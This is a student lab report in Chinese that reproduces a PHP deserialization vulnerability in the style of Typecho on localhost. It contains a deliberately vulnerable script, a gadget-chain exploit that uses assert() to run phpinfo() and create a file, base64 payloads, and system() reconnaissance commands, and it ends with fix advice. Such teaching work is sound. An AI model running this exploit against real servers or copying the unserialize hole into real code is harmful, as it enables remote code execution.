# 软件安全实验13

### 姓名：何叶   学号：2313487   班级：范玲玲班

[TOC]

## 实验名称：反序列化漏洞

## 实验要求：

复现12.2.3中的反序列化漏洞，并执行其他的系统命令。

## 实验原理：

PHP反序列化漏洞是由于对用户可控的输入数据进行  unserialize()  操作而引发的安全问题。当攻击者构造恶意的序列化字符串并将其传递给  unserialize()  函数时，可能会触发对象的魔术方法（如  __toString()  、  __destruct()  等），从而执行恶意代码。在本实验中，  Typecho_Feed  类的  __toString()  方法和  Typecho_Request  类的  _applyFilter()  方法被利用，通过  assert()  函数执行了恶意代码。

## 实验步骤：

### 一、复现反序列化漏洞

#### 1.新建exe.php和typecho.php文件， exp.php  用于生成恶意的序列化字符串，  typecho.php  用于接收并反序列化该字符串。

![image-20250606200357826](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606200357826.png)

#### 2.打开文件夹，观察到文件创建成功

![image-20250606200606906](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606200606906.png)

#### 3.写typecho.php代码

![image-20250606204703807](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606204703807.png)

```php
/*typecho.php*/
<?php
class Typecho_Db{
    public function __construct($adapterName){
        $adapterName = 'Typecho_Db_Adapter_' . $adapterName;
    }
}

class Typecho_Feed{
    private $item;
    public function __toString(){
        $this->item['author']->screenName;
    }
}

class Typecho_Request{

    private $_params = array();
    private $_filter = array();

    public function __get($key)
    {
        return $this->get($key);
    }

    public function get($key, $default = NULL)
    {
        switch (true) {
            case isset($this->_params[$key]):
                $value = $this->_params[$key];
                break;
            default:
                $value = $default;
                break;
        }
        $value = !is_array($value) && strlen($value) > 0 ? $value : $default;
        return $this->_applyFilter($value);
    }

    private function _applyFilter($value)
    {
        if ($this->_filter) {
            foreach ($this->_filter as $filter) {
                $value = is_array($value) ? array_map($filter, $value) :
                call_user_func($filter, $value);
            }

            $this->_filter = array();
        }

        return $value;
    }
}

$config = unserialize(base64_decode($_GET['__typecho_config']));
$db = new Typecho_Db($config['adapter']);
?>
```


 `Typecho_Db`类：构造函数接收`$adapterName`参数，并将其拼接为`'Typecho_Db_Adapter_' . $adapterName`。

 `Typecho_Feed`类：包含私有成员`$item`，并重写了`__toString()`方法，尝试访问`$this->item['author']->screenName`，但`$item`未初始化。

 `Typecho_Request`类：包含私有成员`$_params`和`$_filter`，提供`__get()`、`get()`方法和`_applyFilter()`方法，用于处理参数和应用过滤器。

主逻辑从`$_GET['__typecho_config']`获取数据，解码并反序列化为`$config`，然后使用`$config['adapter']`创建`Typecho_Db`对象。


 反序列化漏洞：`unserialize(base64_decode($_GET['__typecho_config']))`使用了用户可控的输入，攻击者可构造恶意数据，反序列化出任意对象并触发魔术方法（如`__toString()`、`__destruct()`等），从而执行恶意代码。

潜在恶意触发：

`Typecho_Feed`的`__toString()`方法可能触发恶意对象的魔术方法。

 `Typecho_Request`的`_applyFilter()`方法可能执行恶意函数。


修复建议

 禁用反序列化用户输入：不要对用户可控的输入使用`unserialize()`，改用 JSON 格式并通过`json_decode()`解码。

限制魔术方法的使用：确保魔术方法中不会执行危险操作，避免调用用户可控的对象或函数。

 输入验证：对所有用户输入进行严格验证和过滤，确保输入符合预期格式。

#### 4.写exe.php代码

![image-20250606204742991](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606204742991.png)

```php
/*exp.php*/
<?php
class Typecho_Feed
{
    private $item;
	
    public function __construct(){
        $this->item = array(
            'author' => new Typecho_Request(),
        );
    }
}
class Typecho_Request
{
    private $_params = array();
    private $_filter = array();
    public function __construct(){
        $this->_params['screenName'] = 'phpinfo()';
        $this->_filter[0] = 'assert';
    }
}
$exp = array(
    'adapter' => new Typecho_Feed()
);
echo base64_encode(serialize($exp));
?>
```

定义了两个类`Typecho_Feed`和`Typecho_Request`，并创建了一个对象数组`$exp`，最后将该数组序列化并进行Base64编码输出。代码的主要目的是生成一个可利用的序列化字符串，用于触发PHP反序列化漏洞。

`Typecho_Feed`类包含一个私有成员`$item`，在构造函数中初始化为一个数组，其中`'author'`键对应的值是一个`Typecho_Request`对象的实例。`Typecho_Request`类包含两个私有成员`$_params`和`$_filter`，在构造函数中，`$_params`数组的`'screenName'`键被赋值为字符串`'phpinfo()'`，而`$_filter`数组的第一个元素被赋值为字符串`'assert'`。

当`$exp`数组被序列化并Base64编码后，生成的字符串可以被用作恶意输入，传递给存在反序列化漏洞的代码（如前一段代码中的`unserialize(base64_decode($_GET['__typecho_config']))`）。如果该恶意输入被反序列化，`Typecho_Feed`对象的`$item`成员中的`Typecho_Request`对象可能会触发`_applyFilter()`方法，进而调用`assert()`函数执行`phpinfo()`，从而导致信息泄露或其他恶意行为。

#### 5.进入网址127.0.0.1/exe.php

![image-20250606204830493](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606204830493.png)

#### 6.得到payload

![image-20250606204907879](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606204907879.png)

```
YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19
```

#### 7.进入网址127.0.0.1/typecho.php

![image-20250606205232390](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606205232390.png)

#### 8.填入?__typecho_config=payload

![image-20250606205518373](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606205518373.png)

#### 9.得到info()界面，成功

![image-20250606205535545](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606205535545.png)

### 二、执行其他的系统命令

#### 1.可以执行的指令有

##### （1)、列出当前目录下的文件和文件夹php'system("dir");'

输出当前目录下的文件和文件夹列表。

##### （2)、查看当前用户php'system("whoami");'

输出当前运行PHP进程的用户身份。

##### （3)、查看系统信息php'system("systeminfo");'

输出系统详细信息，包括操作系统版本、系统启动时间等。

##### （4)、查看网络连接php'system("netstat -an");'

列出当前系统的网络连接状态。

##### （5)、查看环境变量php'system("set");'

输出当前环境变量的值。

##### （6)、查看系统日志php'system("wevtutil qe Application /rd:true /c:1");'

输出最近的一条应用程序日志（需要管理员权限）。

#### 2.以创建新文件的指令为例，exe.php中修改，改为创建新文件的指令

#### ![image-20250606205948986](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606205948986.png)

#### 3.进入网址127.0.0.1/exe.php

![image-20250606210020458](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606210020458.png)

#### 4.得到新的payload

```
YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjI1OiJmb3BlbignbmV3ZmlsZS50eHQnLCAndycpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX0=
```

#### 5.修改typecho.php,得到正确的toString

![image-20250606210343489](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606210343489.png)

#### 6.再次进入网址127.0.0.1/typecho.php

![image-20250606210320154](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606210320154.png)

#### 7.观察到成功创建新文件，成功执行其他的系统命令

![image-20250606210142776](C:\Users\he'ye\AppData\Roaming\Typora\typora-user-images\image-20250606210142776.png)

## 心得体会：

通过本次实验，我深刻理解了PHP反序列化漏洞的原理和危害。反序列化漏洞是由于对用户输入缺乏严格验证而导致的，攻击者可以利用该漏洞执行任意代码，从而完全控制服务器。在实际开发中，应避免对用户可控的输入使用  unserialize()  ，改用更安全的序列化格式（如JSON）。同时，对所有用户输入进行严格验证和过滤，确保输入符合预期格式，是防止此类漏洞的关键。